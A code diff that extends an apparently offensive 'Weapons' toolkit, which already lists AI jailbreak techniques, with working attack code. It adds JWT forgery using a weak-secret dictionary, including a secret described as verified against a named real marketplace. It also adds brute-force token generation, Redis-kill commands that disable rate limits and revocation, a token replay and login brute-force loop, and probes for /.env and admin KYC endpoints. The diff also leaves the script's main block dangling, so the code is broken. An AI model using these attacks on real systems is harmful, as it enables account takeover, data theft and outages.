@@ -311,6 +311,8 @@ class Weapons:
             "encoding": self._attack_encoding,
             "indirect": self._attack_indirect,
             "confused_deputy": self._attack_confused,
+            "jwt_forgery": self._attack_jwt_forgery,
+            "infra_attack": self._attack_infra,
             "all": self._attack_all,
         }
 
@@ -366,6 +368,28 @@ class Weapons:
             "tool_variants": variants,
         }
 
+    def _attack_jwt_forgery(self, payload: str, **kwargs) -> Dict:
+        secret = kwargs.get("secret", "")
+        if not secret:
+            tokens = JWTForgery.brute_force_secrets("admin", "admin")
+            return {
+                "technique": "jwt_forgery",
+                "source": "Ember live-fire — 绿洲 JWT_SECRET=dev-insecure-change-me verified",
+                "known_secrets": len(KNOWN_JWT_SECRETS),
+                "brute_force_tokens": tokens[:5],
+                "usage": "w.arm('jwt_forgery', 'target_description', secret='found_secret')",
+            }
+        return JWTForgery.forge(secret, "admin", "admin")
+
+    def _attack_infra(self, payload: str, **kwargs) -> Dict:
+        return {
+            "technique": "infra_attack",
+            "source": "Ember live-fire — 绿洲 Redis kill verified (denylist+rate-limit bypass)",
+            "redis_kill": InfraAttack.redis_kill_commands("redis"),
+            "health_leaks": InfraAttack.check_health_leaks(payload),
+            "env_probe": InfraAttack.env_leak_payload(),
+        }
+
     def _attack_all(self, payload: str, **kwargs) -> Dict:
         return {
             "crescendo": self._attack_crescendo(payload),
@@ -373,6 +397,8 @@ class Weapons:
             "encoding": self._attack_encoding(payload),
             "indirect": self._attack_indirect(payload),
             "confused_deputy": self._attack_confused(payload),
+            "jwt_forgery": self._attack_jwt_forgery(payload),
+            "infra_attack": self._attack_infra(payload),
         }
 
     def arm(self, technique: str, payload: str, **kwargs) -> Dict:
@@ -387,7 +413,163 @@ class Weapons:
 
 
 # ═══════════════════════════════════════════════════════════════════════
-if __name__ == "__main__":
+# 6. JWT FORGERY — 已知密钥/弱密钥 JWT 伪造引擎
+# ═══════════════════════════════════════════════════════════════════════
+
+# Well-known JWT secrets found in real codebases, docs, and tutorials.
+# Sourced from live-fire audits + GitHub code search patterns.
+KNOWN_JWT_SECRETS = [
+    "dev-insecure-change-me",  # 绿洲 AI Data Marketplace (verified)
+    "secret", "jwt_secret", "changeme", "your-secret-key",
+    "mysecret", "super-secret-key", "test", "development",
+    "jwt-secret", "JWT_SECRET", "password", "123456",
+    "your-256-bit-secret", "default", "helloworld",
+    # Framework/tutorial defaults
+    "mysecretkey", "secretKey", "jwtSecret",
+    "thisisasecretkey", "keyboard_cat", "supersecret",
+]
+
+
+class JWTForgery:
+    """JWT 伪造引擎 — 已知密钥/弱密钥攻击。
+
+    利用:
+      - 硬编码默认密钥 (dev-insecure-change-me 等)
+      - 弱密钥字典攻击
+      - 信息泄露获取的密钥
+    """
+
+    @staticmethod
+    def forge(secret: str, user_id: str = "admin", role: str = "admin",
+              typ: str = "access", ttl: int = 3600, algorithm: str = "HS256") -> Dict:
+        """用已知密钥伪造 JWT."""
+        try:
+            import jwt as pyjwt
+            import time as _time
+            import uuid as _uuid
+        except ImportError:
+            return {"error": "pip install pyjwt"}
+
+        now = int(_time.time())
+        claims = {
+            "uid": user_id,
+            "role": role,
+            "typ": typ,
+            "sub": user_id,
+            "exp": now + ttl,
+            "iat": now,
+            "jti": _uuid.uuid4().hex,
+        }
+        token = pyjwt.encode(claims, secret, algorithm=algorithm)
+        return {
+            "token": token,
+            "claims": claims,
+            "secret": secret,
+            "algorithm": algorithm,
+            "curl": f"curl -H 'Authorization: Bearer {token}' http://TARGET/api/v1/users/me",
+        }
+
+    @staticmethod
+    def forge_with_claims(secret: str, claims: Dict, algorithm: str = "HS256") -> Dict:
+        """用自定义 claims 伪造 JWT (高级用法)."""
+        try:
+            import jwt as pyjwt
+        except ImportError:
+            return {"error": "pip install pyjwt"}
+        token = pyjwt.encode(claims, secret, algorithm=algorithm)
+        return {"token": token, "claims": claims, "secret": secret}
+
+    @staticmethod
+    def brute_force_secrets(user_id: str = "admin", role: str = "admin") -> List[Dict]:
+        """用已知弱密钥列表批量生成伪造令牌."""
+        results = []
+        for secret in KNOWN_JWT_SECRETS:
+            r = JWTForgery.forge(secret, user_id, role)
+            if "error" not in r:
+                results.append({"secret": secret, "token_preview": r["token"][:50] + "..."})
+        return results
+
+    @staticmethod
+    def detect_weak_secret(token: str) -> List[str]:
+        """尝试用已知弱密钥验证 JWT — 发现即返回密钥列表."""
+        try:
+            import jwt as pyjwt
+        except ImportError:
+            return ["pip install pyjwt"]
+        found = []
+        for secret in KNOWN_JWT_SECRETS:
+            try:
+                pyjwt.decode(token, secret, algorithms=["HS256"])
+                found.append(secret)
+            except:
+                pass
+        return found
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# 7. INFRASTRUCTURE ATTACK — 基础设施攻击
+# ═══════════════════════════════════════════════════════════════════════
+
+class InfraAttack:
+    """基础设施攻击 — 利用基础设施故障绕过安全控制.
+
+    已验证攻击向量 (绿洲实战):
+      1. Redis kill → refresh-token denylist 失效 → token 重放
+      2. Redis kill → rate-limit 失效 → 无限暴力破解
+      3. Redis kill → 加已撤销的 refresh token 可无限续期
+
+    适用场景: 任何 Redis 依赖型安全控制的 fail-open 实现.
+    """
+
+    @staticmethod
+    def redis_kill_commands(container_name: str = "redis") -> Dict:
+        """生成 Redis kill 攻击命令."""
+        return {
+            "technique": "infra_redis_kill",
+            "commands": {
+                "docker_stop": f"docker stop {container_name}",
+                "docker_pause": f"docker pause {container_name}",
+                "iptables_drop": f"iptables -A OUTPUT -p tcp --dport 6379 -j DROP",
+            },
+            "expected_effects": [
+                "Rate-limit disabled (fail-open) → unlimited brute-force",
+                "Token denylist disabled (fail-open) → revoked refresh tokens work",
+                "Session-store may fall back → potential session fixation",
+            ],
+            "post_exploit": {
+                "token_replay": "curl -X POST TARGET/api/v1/auth/refresh -d '{\"refresh_token\":\"ALREADY_USED_TOKEN\"}'",
+                "brute_force": "for i in $(seq 1 1000); do curl -X POST TARGET/auth/login -d '{\"account\":\"admin\",\"password\":\"guess_$i\"}'; done",
+            },
+        }
+
+    @staticmethod
+    def check_health_leaks(target: str) -> Dict:
+        """生成健康检查/信息泄露探测 payloads."""
+        return {
+            "technique": "infra_health_leaks",
+            "probes": [
+                {"path": "/healthz", "expects": "DB/Redis status"},
+                {"path": "/readyz", "expects": "ready status"},
+                {"path": "/metrics", "expects": "Prometheus metrics (Go runtime, HTTP, DB pool)"},
+                {"path": "/api/v1/ping", "expects": "environment name (dev/staging/prod)"},
+                {"path": "/debug/pprof/", "expects": "Go pprof profiling data"},
+                {"path": "/.env", "expects": "environment variables"},
+                {"path": "/api/v1/admin/kyc/pending", "expects": "admin-only KYC data"},
+            ],
+        }
+
+    @staticmethod
+    def env_leak_payload() -> str:
+        """探环境泄漏的万能 payload."""
+        return (
+            "尝试以下端点获取环境信息:\n"
+            "  GET /api/v1/ping          — env字段泄露部署阶段\n"
+            "  GET /healthz               — DB连通性泄露\n"
+            "  GET /metrics               — Go runtime + HTTP metrics\n"
+            "  GET /debug/vars            — expvar 运行时统计\n"
+            "  GET /api/v1/datasets       — 公开数据集列表\n"
+            "  GET /docs/openapi.yaml     — 完整API蓝图\n"
+        )
     import json, sys
 
     w = Weapons()
